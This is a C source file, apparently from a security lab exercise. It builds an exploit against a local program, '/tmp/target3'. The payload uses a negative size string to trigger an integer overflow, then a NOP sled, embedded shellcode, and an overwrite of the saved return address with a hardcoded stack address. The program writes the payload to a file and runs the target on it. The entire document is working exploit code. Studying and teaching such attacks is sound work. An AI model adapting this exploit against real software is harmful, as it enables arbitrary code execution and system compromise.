#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"
#include <stdlib.h>

#define TARGET_APPLICATION "/tmp/target3"
#define FINAL_OUTPUT_PATH  "/tmp/exploit_file_3"

struct PayloadConfig {
    const char *size_trigger_str;
    size_t data_element_count;
    size_t element_byte_size;
    unsigned char target_return_addr[8];
};

int main(void)
{
    struct PayloadConfig config = {
        .size_trigger_str = "-768614336404563600,",

        .data_element_count = 1000,
        .element_byte_size = 24, 
        .target_return_addr = { 0x48, 0x91, 0xfe, 0xff, 0xff, 0x7F, 0x00, 0x00 } 
    };
    
    const size_t prefix_len = strlen(config.size_trigger_str);
    const size_t sled_data_len = config.data_element_count * config.element_byte_size; // 24000
    
    //  total size needed = Prefix + Data Sled + RBP Slot (8) + RIP Slot (8)
    const size_t total_exploit_len = prefix_len + sled_data_len + 8 + 8;
    
    // allocate necessary memory
    char *exploit_buffer = (char *)malloc(total_exploit_len);
    if (!exploit_buffer) {
        perror("Failed to allocate memory");
        return EXIT_FAILURE;
    }

    // copy integer overflow trigger string
    memcpy(exploit_buffer, config.size_trigger_str, prefix_len);
    
    // fill main data area with NOP sled
    const size_t sled_start_offset = prefix_len;
    memset(exploit_buffer + sled_start_offset, '\x90', sled_data_len);
    
    // insert shellcode in NOP sled
    const size_t shellcode_offset = sled_start_offset + 512; // Start at 512 bytes into the sled
    memcpy(exploit_buffer + shellcode_offset, shellcode, sizeof(shellcode));
    
    // offset: Sled Data (24000) + Saved RBP (8) = 24008 bytes after the data starts
    const size_t rip_overwrite_offset = sled_start_offset + 24008;
    memcpy(exploit_buffer + rip_overwrite_offset, config.target_return_addr, sizeof(config.target_return_addr));

    write_xploit(exploit_buffer, total_exploit_len, FINAL_OUTPUT_PATH);

    char *exec_args[] = { TARGET_APPLICATION, FINAL_OUTPUT_PATH, NULL };
    char *exec_env[] = { NULL };

    execve(TARGET_APPLICATION, exec_args, exec_env);
    perror("execve failed");
    fprintf(stderr, "Check installation: execute \"sudo make install\"\n");

    free(exploit_buffer);
    return 0;
}
